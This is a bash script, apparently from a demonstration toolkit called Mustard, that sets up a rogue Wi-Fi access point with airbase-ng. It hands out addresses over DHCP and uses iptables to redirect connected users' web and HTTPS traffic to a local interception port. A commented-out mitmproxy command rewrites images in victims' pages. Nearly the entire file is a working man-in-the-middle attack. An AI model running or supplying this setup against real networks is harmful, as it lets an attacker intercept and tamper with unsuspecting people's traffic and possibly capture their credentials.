#!/bin/bash

######################################################################################
######################################################################################

# Authors: Alex Walker, Luuk Derksen

# INSTRUCTIONS:
# call the scripts and pass it the gateway address, this machines internet access:
# e.g ./start_accesspoint.sh

######################################################################################
######################################################################################

#check for root/sudo
if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi
export STATE=PRODUCTION
# SETUP
read -p "what is the gateway (route -n)? " -e GATEWAY
echo "The gateway is $GATEWAY"
read -p "What interface provides internet? " -e DEV_INET
echo "The internet interface set is $DEV_INET"
read -p "What interface will provide the access point? " -e DEV_WLAN
echo "The access point interface set is $DEV_WLAN"
read -p "What do you want to call the access point? " -e AP_NAME
echo "The access point is set as $AP_NAME"


AP_MAC=""
DEV_AP="at0"

# Command to disable rfblocking.
rfkill unblock wifi

echo "Starting $DEV_WLAN in Monitor mode"
ifconfig $DEV_WLAN down
sleep 1
iwconfig $DEV_WLAN mode Monitor
sleep 1
ifconfig $DEV_WLAN up


######################################################################################
######################################################################################


# To setup an accesspoint we can use airbase-ng
echo "Starting the rogue AccessPoint"
# Add -y to prevent probe requests
airbase-ng --essid "$AP_NAME" $DEV_WLAN -v &
echo "AccessPoint up and running"

# Make the accesspoint externally facing
sleep 3; 
ifconfig $DEV_AP up 192.168.99.1 netmask 255.255.255.0
sleep 2


# Start the DHCP server.
route add -net 192.168.99.0 netmask 255.255.255.0 gw 192.168.99.1
service isc-dhcp-server start > /dev/null 2>&1 
sleep 5



echo 0 > /proc/sys/net/ipv4/ip_forward

# Flush the iptables.
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
# Then reconfigure the iptables
# iptables -P FORWARD ACCEPT #--- why dont we use this?
iptables --table nat --append POSTROUTING --out-interface $DEV_INET -j MASQUERADE
iptables --append FORWARD --in-interface $DEV_AP -j ACCEPT
iptables --table nat --append PREROUTING --protocol udp --dport 53 -j DNAT --to $GATEWAY

# This is only for something that is going to redirect the connection back.

#THIS LINE IS FOR MITMPROXY/BURP
#mitmproxy -T --host --replace :~hq~s:"<img\s[^>]*?src\s*=\s*['\"]([^'\"]*?)['\"][^>]*?>":"<img src=\"http://www.thedrum.com/uploads/drum_basic_article/147818/main_images/decoded.jpg\">"


# Configure the IPTables
iptables -t nat -A PREROUTING --protocol tcp --dport 80 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING --protocol tcp --dport 443 -j REDIRECT --to-ports 8080
iptables -t nat -A PREROUTING --protocol tcp --dport 9000 -j REDIRECT --to-ports 8080



echo 1 > /proc/sys/net/ipv4/ip_forward


######################################################################################
######################################################################################

# You must run go get github.com/DecodedCo/Mustard before this will work

revel run github.com/DecodedCo/Mustard &

iceweasel 127.0.0.1:9000
